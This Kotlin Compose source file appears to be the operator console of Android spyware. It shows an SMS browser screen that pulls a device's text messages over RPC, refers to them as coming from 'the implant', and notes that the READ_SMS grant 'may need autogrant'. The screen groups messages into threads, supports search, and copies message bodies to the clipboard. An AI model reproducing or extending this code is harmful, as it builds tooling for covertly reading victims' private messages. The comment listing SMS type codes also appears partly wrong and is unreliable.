package com.shadow.operator.ui.cap

import android.widget.Toast
import androidx.compose.foundation.clickable
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.shadow.operator.data.RpcClient
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

private val DATE_FMT = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US)

private fun stamp(ms: String): String =
    ms.toLongOrNull()?.let { DATE_FMT.format(Date(it)) } ?: ms

/** One message as returned by content://sms (address, body, date, type). */
private data class Msg(val address: String, val body: String, val date: String, val type: String)

private data class Thread(val address: String, val msgs: List<Msg>) {
    val last: Msg get() = msgs.first()
}

/**
 * SMS browser: threads first, conversation on tap.
 *
 * Grouping happens here rather than on the implant so a re-read costs one RPC;
 * direction comes from the sms "type" column (1 inbox, 2 sent, 3 outbox, 4 draft,
 * 5 failed, 6 queued, 7 sent-via-SMSC, 8 deleted, 9 draft).
 */
@Composable
fun SmsScreen(rpc: RpcClient, onNavigateBack: () -> Unit) {
    val scope = rememberCoroutineScope()
    val clipboard = LocalClipboardManager.current
    val ctx = LocalContext.current
    val load = remember { CapLoad("sms") }
    var query by remember { mutableStateOf("") }
    var box by remember { mutableStateOf("All") }
    var open by remember { mutableStateOf<Thread?>(null) }

    LaunchedEffect(Unit) { load.run(rpc) }

    val boxes = listOf("All", "Inbox", "Sent")

    val all: List<Msg> = remember(load.raw) {
        load.table().rows.mapNotNull { r ->
            if (r.size < 3) return@mapNotNull null
            Msg(r[0].ifBlank { "?" }, r.getOrElse(1) { "" }, r.getOrElse(2) { "" }, r.getOrElse(3) { "" })
        }
    }

    val threads: List<Thread> = remember(all, box, query) {
        val filtered = all.filter { m ->
            when (box) {
                "Inbox" -> m.type == "1"
                "Sent" -> m.type == "2"
                else -> true
            } && (query.isBlank() || m.address.contains(query, true) || m.body.contains(query, true))
        }
        filtered.groupBy { it.address }.map { (a, ms) -> Thread(a, ms) }
            .sortedByDescending { it.last.date.toLongOrNull() ?: 0L }
    }

    CapabilityScreen(
        title = "SMS",
        subtitle = if (load.error != null) "error"
        else "${threads.size} threads · ${all.size} messages · ${load.tookMs} ms",
        onBack = onNavigateBack,
        loading = load.loading,
        onRefresh = { scope.launch { load.run(rpc) } },
        accent = CapPurple,
        actions = {
            IconButton(onClick = {
                clipboard.setText(AnnotatedString(load.raw))
                Toast.makeText(ctx, "Copied ${load.raw.length} chars", Toast.LENGTH_SHORT).show()
            }) {
                Icon(Icons.Default.ContentCopy, "Copy all", tint = CapText)
            }
        }
    ) {
        load.error?.let { CapMessage(it.take(400), CapRed); return@CapabilityScreen }

        CapFilters(boxes, box) { box = it }
        CapSearch(query, { query = it }, "search threads and message bodies")

        if (threads.isEmpty() && !load.loading) {
            CapMessage(
                if (all.isEmpty()) "no messages read\n(check READ_SMS; grant may need autogrant)"
                else "nothing matches the current filter",
                if (all.isEmpty()) CapAmber else CapFaint
            )
            return@CapabilityScreen
        }

        LazyColumn(Modifier.fillMaxSize(), contentPadding = PaddingValues(bottom = 16.dp)) {
            items(threads) { t ->
                Column(Modifier.fillMaxWidth().clickable { open = t }
                    .padding(horizontal = 16.dp, vertical = 10.dp)) {
                    Row(Modifier.fillMaxWidth()) {
                        Text(t.address, color = CapText, fontSize = 14.sp,
                            fontWeight = FontWeight.Medium, fontFamily = FontFamily.Monospace,
                            modifier = Modifier.weight(1f))
                        Text(stamp(t.last.date), color = CapFaint, fontSize = 11.sp,
                            fontFamily = FontFamily.Monospace)
                    }
                    Text(
                        t.last.body.ifBlank { "(empty body)" }.take(90),
                        color = if (t.last.type == "2") CapBlue else CapDim,
                        fontSize = 12.sp, maxLines = 2,
                        fontFamily = FontFamily.Monospace
                    )
                    Text("${t.msgs.size} msgs", color = CapFaint, fontSize = 10.sp,
                        fontFamily = FontFamily.Monospace)
                }
                HorizontalDivider(color = CapBorder)
            }
        }
    }

    open?.let { t ->
        AlertDialog(
            onDismissRequest = { open = null },
            containerColor = CapSurface,
            title = {
                Text(t.address, color = CapBright, fontSize = 15.sp, fontFamily = FontFamily.Monospace)
            },
            text = {
                Column(
                    Modifier.fillMaxWidth().heightIn(max = 420.dp)
                        .verticalScroll(rememberScrollState()),
                    verticalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    t.msgs.sortedBy { it.date.toLongOrNull() ?: 0L }.forEach { m ->
                        Column(Modifier.fillMaxWidth().clickable {
                            clipboard.setText(AnnotatedString(m.body))
                            Toast.makeText(ctx, "Copied message", Toast.LENGTH_SHORT).show()
                        }) {
                            Text(
                                "${if (m.type == "2") "OUT" else "IN"}  ${stamp(m.date)}",
                                color = if (m.type == "2") CapBlue else CapGreen,
                                fontSize = 10.sp, fontFamily = FontFamily.Monospace
                            )
                            Text(m.body, color = CapText, fontSize = 13.sp,
                                fontFamily = FontFamily.Monospace)
                        }
                    }
                }
            },
            confirmButton = {
                TextButton(onClick = { open = null }) {
                    Text("Close", color = CapBlue, fontFamily = FontFamily.Monospace, fontSize = 13.sp)
                }
            }
        )
    }
}
